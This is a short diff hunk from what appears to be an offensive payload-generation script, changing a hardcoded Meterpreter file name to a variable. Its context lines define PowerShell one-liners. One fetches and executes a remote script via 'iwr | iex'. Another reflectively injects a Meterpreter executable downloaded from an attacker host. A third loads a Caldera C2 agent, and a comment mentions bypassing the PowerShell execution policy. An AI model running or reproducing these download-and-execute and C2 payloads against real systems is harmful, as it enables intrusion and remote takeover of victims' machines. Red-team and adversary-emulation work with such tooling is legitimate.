@@ -20,7 +20,7 @@ elif reverse_tcp:
 ## preloaded information
 win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
 invoke_reflective = f'iwr http://{HOST_IP}:{HOST_PORT}/Invoke-Reflective.ps1 | iex'
-reflective_meterpreter = f'Invoke-ReflectivePEInjection -PEBytes (iwr http://{HOST_IP}:{HOST_PORT}/meterpreter.exe).Content'
+reflective_meterpreter = f'Invoke-ReflectivePEInjection -PEBytes (iwr http://{HOST_IP}:{HOST_PORT}/{meterpreter_file}).Content'
 reflective_caldera = f'Invoke-ReflectivePEInjection -ExeArgs "-socket {CALDERA_IP}:{CALDERA_SOCKET_PORT} -http {CALDERA_IP}:{CALDERA_WEB_PORT} -contact tcp" -PEBytes (iwr -Uri "http://{CALDERA_IP}:{CALDERA_WEB_PORT}/file/download" -Method GET -Headers @{win_caldera_headers}).Content'
 
 # creates a powershell with ExecutionPolicy bypassed 
